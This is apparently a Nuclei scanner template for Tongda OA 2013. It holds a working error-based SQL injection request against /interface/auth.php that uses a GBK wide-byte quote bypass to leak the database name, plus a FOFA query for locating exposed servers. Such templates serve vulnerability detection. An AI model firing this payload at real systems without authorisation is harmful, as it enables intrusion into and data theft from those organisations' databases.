id: tongda-oa-interface-auth-sqli

info:
  name: 通达 OA 2013 /interface/auth.php - sqli
  author: linuxlz
  severity: high
  description: 
  reference:
    - https://mp.weixin.qq.com/s/6ajtYnyBSzcZrATQp_0i5A
  metadata:
    veified: true
    fofa-query: "Office Anywhere 2013"
  tags: tongda,oa,sqli

http:
  - raw:
      - |
        GET /interface/auth.php?&PASSWORD=1&USER_ID=%df%27 and (select 1 from (select count(*),concat((select concat(0x3a,(select database()) ,0x3a) from user limit 1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23 HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        part: body
        words:
          - "错误#1062:"
          - "SQL语句:"
          - ":td_oa:1"
        condition: and 